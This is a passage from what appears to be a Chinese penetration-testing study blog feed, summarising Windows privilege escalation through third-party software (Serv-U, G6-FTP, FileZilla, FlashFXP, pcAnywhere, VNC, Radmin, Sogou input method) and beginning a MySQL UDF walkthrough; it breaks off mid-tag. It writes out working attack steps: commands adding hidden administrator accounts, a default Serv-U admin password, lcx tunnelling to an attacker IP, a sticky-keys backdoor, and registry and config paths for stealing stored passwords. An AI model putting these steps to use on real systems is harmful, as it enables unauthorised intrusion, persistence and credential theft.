    <content type="html"><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要记录一些通过第三方软件提权的方式，主要包括一些ftp管理软件，远程管理软件等等。。。</p><h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul><li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li><li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li><li>serv-u密码文件：ServUDaemon.ini</li><li>端口号：默认端口是43958<br>ServUDaemon.ini中lccalsetuportNo=端口</li></ul><h5 id="FTP提权方法"><a href="#FTP提权方法" class="headerlink" title="FTP提权方法"></a>FTP提权方法</h5><p>1、有修改权限</p><p>2、无权限修改</p><p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p><p>4、serv-u ftp转发端口</p><h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[USER=quan|<span class="number">1</span>]                                <span class="comment">//用户名</span></span><br><span class="line">Password=    <span class="comment">//用户密码加密后的密文</span></span><br><span class="line">HomeDir=c:\ftp\quan             <span class="comment">//目录</span></span><br><span class="line">RelPaths=<span class="number">3</span> </span><br><span class="line">TimeOut=<span class="number">600</span>                      <span class="comment">//超时时间设置</span></span><br><span class="line">Maintenance=System               <span class="comment">//权限</span></span><br><span class="line">Access1=C:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access2=d:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access3=e:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">SKEYValues=</span><br></pre></td></tr></table></figure><p>password=2位随机字符+md5(2位随机字符+123456)</p><p>4、连接目标FTP服务器</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ftp</span> 目标<span class="built_in">IP</span>地址 刚添加的用户密码</span><br></pre></td></tr></table></figure><p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quote site exec net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">quote site exec net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p><h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d:\serv_u.exe</span><br><span class="line">d:\serv_u.exe “net<span class="built_in"> user </span>quan quan123 /add”</span><br><span class="line">d:\serv_u.exe “net localgroup administrators quan /add”</span><br></pre></td></tr></table></figure><p>注意命令要有引号</p><h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave yourIP <span class="number">5000</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">43958</span></span><br></pre></td></tr></table></figure><p>在本机上运行</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -<span class="section">listen</span> <span class="number">5000</span> <span class="number">21</span></span><br></pre></td></tr></table></figure><p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p><p>这里就不写具体过程了</p><h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200429095652.png" alt=""></p><h5 id="G6-FTP简介"><a href="#G6-FTP简介" class="headerlink" title="G6-FTP简介"></a>G6-FTP简介</h5><ul><li>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</li><li>G6-FTP的默认端口为<code>8021</code>，只侦听在127.0.0.1的8021端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</li></ul><h5 id="提权关键"><a href="#提权关键" class="headerlink" title="提权关键"></a>提权关键</h5><p>使用lcx时必须保证两个前提，肉鸡A和内网机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。</p><h5 id="提取方法"><a href="#提取方法" class="headerlink" title="提取方法"></a>提取方法</h5><p>1、通过执行bat文件提权<br>2、通过映射bat文件提权</p><h5 id="通过执行bat文件提权"><a href="#通过执行bat文件提权" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>步骤如下</p><ul><li><p>下载配置文件<code>Remote.ini</code>，将<code>administrator</code>管理密码解密<br>用cmd5 破解</p></li><li><p>查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p></li><li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">8027</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8021</span></span><br></pre></td></tr></table></figure><ul><li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p></li><li><p>创建FTP用户并进行权限设置</p></li><li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><ul><li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p></li><li><p>普通用户登录ftp</p></li><li><p>执行所加入的批处理命令<br>执行命令<code>quote site adduser.bat</code></p></li></ul><h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><p>5、将a.bat文件映射到新建的site命令</p><p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p><h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul><li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li><li>FileZilla的默认端口为<code>14147</code>，只侦听在127.0.0.1的14147端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。默认安装目录下有两个敏感文件<code>filezillaserver.xml</code>（包含用户信息）和<code>filezillaserverinterface.xml</code>（包含管理信息）</li></ul><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p><p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p><p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">14148</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">14147</span></span><br></pre></td></tr></table></figure><p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p><p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p><p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p><p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p><p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p><p>9、添加一个用户，并将其提升为管理员权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan 123 /add</span><br><span class="line">net localgroup administrator quan /add</span><br></pre></td></tr></table></figure><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p><p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p><h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol><li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li><li>上传利用到2008启动项 目录里，c:/users/administrator/appdata/roaming/microsoft/windows/start menu/programs/startup/</li><li>替换system系统服务程序，进行提权。</li></ol><h4 id="第三方软件FlashFXP提权"><a href="#第三方软件FlashFXP提权" class="headerlink" title="第三方软件FlashFXP提权"></a>第三方软件FlashFXP提权</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200429102747.png" alt=""></p><h5 id="1、FlashFXP简介"><a href="#1、FlashFXP简介" class="headerlink" title="1、FlashFXP简介"></a>1、FlashFXP简介</h5><ul><li>FlashFXP是一款功能强大的FXP/FTP软件，集成了其它优秀的FTP软件的优点，如CuteFTP的目录比较，支持彩色文字显示；如BpFTP支持多目录选择文件，暂存目录；又如LeapFTP的界面设计。</li></ul><h5 id="2、提权思路"><a href="#2、提权思路" class="headerlink" title="2、提权思路"></a>2、提权思路</h5><p>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p><h5 id="3、提权步骤"><a href="#3、提权步骤" class="headerlink" title="3、提权步骤"></a>3、提权步骤</h5><p>（1）下载quick.dat这个文件<br>链接的账号密码都保存在<code>quick.dat</code><br>falshfxp默认安装目录：C:\Program Files\flashfxp</p><p>（2）本地覆盖<br>打开我们本机的FlashFTP把原先的文件替换掉</p><p>（3）获取网站管理密码<br>打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息。<br>如果想要获取密码，可下载星号密码查看工具查看暗文</p><h4 id="第三方软件pcAnywhere提权"><a href="#第三方软件pcAnywhere提权" class="headerlink" title="第三方软件pcAnywhere提权"></a>第三方软件pcAnywhere提权</h4><h5 id="1、pcAnywhere简介"><a href="#1、pcAnywhere简介" class="headerlink" title="1、pcAnywhere简介"></a>1、pcAnywhere简介</h5><ul><li>PcAnywhere是一款远程控制软件，你可以将你的电脑当成主控端去控制远方另一台同样安装有pcANYWHERE的电脑（被控端），你可以使用被控端电脑上的程序或在主控端与被控端之间互传文件。</li><li>pcAnywher的默认端口为<code>5631、5632</code>。</li><li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li></ul><h5 id="2、提权步骤"><a href="#2、提权步骤" class="headerlink" title="2、提权步骤"></a><strong>2、提权步骤</strong></h5><p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dir</span> <span class="regexp">*.cif</span>/s</span><br></pre></td></tr></table></figure><p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p><p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p><h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p><h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p><h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\R</span>ealVNC<span class="symbol">\W</span>inVNC4<span class="symbol">\P</span>assword</span><br></pre></td></tr></table></figure><p>（2）UltraVNC的注册表路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\O</span>RL<span class="symbol">\W</span>inVNC3<span class="symbol">\D</span>efault<span class="symbol">\p</span>assword</span><br></pre></td></tr></table></figure><p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p><p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p><p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p><h4 id="第三方软件Radmin提权"><a href="#第三方软件Radmin提权" class="headerlink" title="第三方软件Radmin提权"></a>第三方软件Radmin提权</h4><h5 id="Radmin简介"><a href="#Radmin简介" class="headerlink" title="Radmin简介"></a>Radmin简介</h5><ul><li>Radmin是平时在windows下用的比较多的一个远程管理工具。其具有支持多个连接和IP 过滤(即允许特定的IP控制远程机器)、个性化的档互传、远程关机、支持高分辨率模式、基于Windows NT的安全支持及密码保护以及提供日志文件支持等特性。</li><li>默认开放 <code>4899</code>端口</li><li>Radmin server2.X、Radmin server3.0都存在一个“致命”漏洞 —— radmin hash提权漏洞</li></ul><h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p><h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersParameter<span class="comment">//默认密码注册表位置</span></span><br><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersPort <span class="comment">//默认端口注册表位置</span></span><br></pre></td></tr></table></figure><p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p><p><strong>3、查看远程屏幕</strong></p><p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p><p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p><p><strong>5、登录远程桌面</strong></p><p>在本地打开远程桌面连接器，输入远端IP进行登录。</p><h4 id="第三方软件搜狗输入法提权"><a href="#第三方软件搜狗输入法提权" class="headerlink" title="第三方软件搜狗输入法提权"></a>第三方软件搜狗输入法提权</h4><h5 id="提权简介"><a href="#提权简介" class="headerlink" title="提权简介"></a>提权简介</h5><p>​            搜狗低版本输入法根目录下有一个：<strong>PinyinUp.exe</strong>是用来更新词典用的，管理员为了保存词库，有可能会把搜狗输入法安装到D盘，搜狗输入法目录默认是Everyone可读可写，搜狗每隔一段时间就会自动升级，而升级的文件是<strong>PinyinUp.exe</strong>，</p><p>​            由于搜狗输入法默认设置是自动更新，更新程序没有对exe做任何校验直接在输入法升级时调用运行，导致可以执行恶意代码。</p><h5 id="提权步骤-2"><a href="#提权步骤-2" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>​         我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。搜狗拼音输入法，会定时调用这个文件进行升级，用户无法禁止。</p><p>（很老的一个漏洞了，现在应该这种情况应该也很少见了。。。。。）</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://cloud.tencent.com/developer/article/1547098" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1547098</a></p><p><a href="https://yqxy20.blog.csdn.net/article/details/99707033" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99707033</a></p><p><a href="https://yqxy20.blog.csdn.net/article/details/99715736" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99715736</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;提权之第三方软件提权总结&quot;&gt;&lt;a href=&quot;#提权之第三方软件提权总结&quot; class=&quot;headerlink&quot; title=&quot;提权之第三方软件提权总结&quot;&gt;&lt;/a&gt;提权之第三方软件提权总结&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="提权" scheme="https://shu1l.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>windows渗透测试中常见提权方式总结(二)</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/</id>
    <published>2020-04-28T01:56:41.000Z</published>
    <updated>2020-05-17T11:36:05.721Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试中常见提权方式总结（二）"><a href="#渗透测试中常见提权方式总结（二）" class="headerlink" title="渗透测试中常见提权方式总结（二）"></a>渗透测试中常见提权方式总结（二）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql提权概述"><a href="#mysql提权概述" class="headerlink" title="mysql提权概述"></a>mysql提权概述</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul><li><strong>功能型：</strong>udf提权</li><li><strong>技巧型：</strong>启动项提权</li><li><strong>漏洞型：</strong>mof提权</li></ul><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p><p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p><p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p><h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p><ul><li><p>上传大马webshell，利用大马中的UDF提权功能完成提权。</p></li><li><p>反弹shell，进而获取交互式tty shell，在shell中连接本地数据库，从而完成UDF提权。</p></li><li><p>利用FuckMySQL，本地执行命令。<a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">FuckMySQL</a>项目针对Windows平台。</p></li><li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p></li><li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p><p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p></li></ul><h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p><ul><li>MySQL 数据库没有开启安全模式。</li><li>已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</li><li>shell 有写入到数据库安装目录的权限。</li></ul><p><strong>高版本mysql(mysql Version&gt;5.7)遇到的一些问题：</strong></p><ul><li><p>secure-file-priv默认不为空，即不允许在任意文件夹中导出文件；</p><ul><li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">""</span></span><br></pre></td></tr></table></figure><pre><code>将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li><li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p></li><li><p>mysql.user下password列更改为authentication_string列。</p></li></ul><h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p><p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p><p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p><p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p><p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p><p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p><p>还可以执行数据库命令：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p><p>这里补充一个点:</p><ul><li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li><li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li></ul><p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p><p>用NTFS ADS流模式突破进而创建文件夹</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir;  <span class="regexp">//</span>查找到mysql的目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建<span class="class"><span class="keyword">lib</span>目录</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure><p>我直接在菜刀下创建plugin文件夹</p><p>然后最关键的一步：<strong>导出UDF文件</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p><p>导出后，再次尝试文件已经存在，说明导入成功。</p><p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p><p>引入sys_eval函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'moonudf.dll'</span></span><br></pre></td></tr></table></figure><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p><p>之后使用命令模板即可执行命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="symbol">'ipconfig</span>)</span><br></pre></td></tr></table></figure><p>也可以直接使用大马这里的功能选项：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p><h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p><p>进入模块，看一下需要配置选项：</p><p><img 